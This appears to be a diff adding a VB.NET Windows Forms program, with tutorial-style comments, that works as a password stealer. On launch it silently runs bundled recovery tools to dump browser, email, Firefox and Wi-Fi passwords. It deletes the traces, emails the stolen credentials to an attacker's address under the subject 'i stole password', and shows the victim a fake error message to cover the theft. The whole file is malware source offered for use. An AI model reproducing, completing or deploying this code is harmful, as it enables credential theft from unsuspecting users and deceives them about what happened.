@@ -1,0 +1,73 @@
+Imports System.Net.Mail 'we need to import this to send email
+
+
+
+Public Class Form1
+    Dim server As String ="smtp.mail.com" 'use it if you are using mail.com
+    Dim username As String = "add your email"
+    Dim password As String = "email password"
+    Dim port = 587 'keep it for most mail websites
+
+    Private Sub form1_load(sender As Object, e As EventArgs) Handles MyBase.Load
+        On Error Resume Next 'this means that if the program encounters an eror it will continue
+
+        Dim home As String = My.Computer.FileSystem.SpecialDirectories.MyMusic & "\home\" 'declares 'home' to the music directory( here we will wxtract the files)
+        If My.Computer.FileSystem.DirectoryExists(home) Then
+            My.Computer.FileSystem.DeleteDirectory(home, FileIO.DeleteDirectoryOption.DeleteAllContents) 'this checks if the directory exists and if yes deletes it
+
+        End If
+
+        MkDir(home) 'it creates the directory
+        
+        add dowloaded programs,,iepv.exe,mailpv.exe......
+
+        IO.File.WriteAllBytes(home & "iepv.exe", My.Resources.iepv) 'it emports the recovery program from the resources directory
+        IO.File.WriteAllBytes(home & "mailpv.exe", My.Resources.mailpv)
+        IO.File.WriteAllBytes(home & "PasswordFox.exe", My.Resources.PasswordFox)
+        IO.File.WriteAllBytes(home & "WirelessKeyView.exe", My.Resources.WirelessKeyView)
+
+        Process.Start(home & "iepv.exe", "/stext iepv.txt") 'it starts the recovery program which exports the passwords to the text file
+        Process.Start(home & "mailpv.exe", "/stext mailpv.txt")
+        Process.Start(home & "PasswordFox.exe", "/stext PasswordFox.txt")
+        Process.Start(home & "WirelessKeyView.exe", "/stext WirelessKeyView.txt")
+
+        Threading.Thread.Sleep(2000) 'waits 2 seconds for the program to export the password
+
+        Dim a As String = IO.File.ReadAllText(Application.StartupPath & "/iepv.txt") 'after the wait it reads the produced text files
+        Dim b As String = IO.File.ReadAllText(Application.StartupPath & "/mailpv.txt")
+        Dim c As String = IO.File.ReadAllText(Application.StartupPath & "/PasswordFox.txt")
+        Dim d As String = IO.File.ReadAllText(Application.StartupPath & "/WirelessKeyView.txt")
+
+        Dim final As String = a & vbNewLine & "...next..." & vbNewLine & b & "...next.." & vbNewLine & c & "...next..." & vbNewLine & d  'it organizes them into final string
+
+        Kill(Application.StartupPath & "/iepv.txt") 'it deletes the text files to remove the trace of the application
+        Kill(Application.StartupPath & "/mailpv.txt")
+        Kill(Application.StartupPath & "/PasswordFox.txt")
+        Kill(Application.StartupPath & "/WirelessKeyView.txt")
+
+
+        Dim smtpServer As New SmtpClient() 'now it creates an smtp client to send us the email to us
+        Dim mail As New MailMessage()
+        smtpServer.Credentials = New Net.NetworkCredential(username, password)
+        smtpServer.Port = port
+        smtpServer.Host = "smtp.mail.com"
+        smtpServer.EnableSsl = True
+        mail = New MailMessage()
+        mail.From = New MailAddress(username)
+        mail.To.Add("your email") '<----lock here.
+        mail.Subject = "i stole password @ " & My.Computer.Clock.LocalTime
+        mail.Body = final
+        smtpServer.Send(mail) 'sends mail
+        MsgBox("critical error runtime at 0X009b (thread_start) 011 not responding to hook", MsgBoxStyle.Critical, "DLL not responding") 'shows fake error message to victim
+
+        Me.Close() 'closes itself
+
+
+
+    End Sub
+
+
+
+
+
+End Class
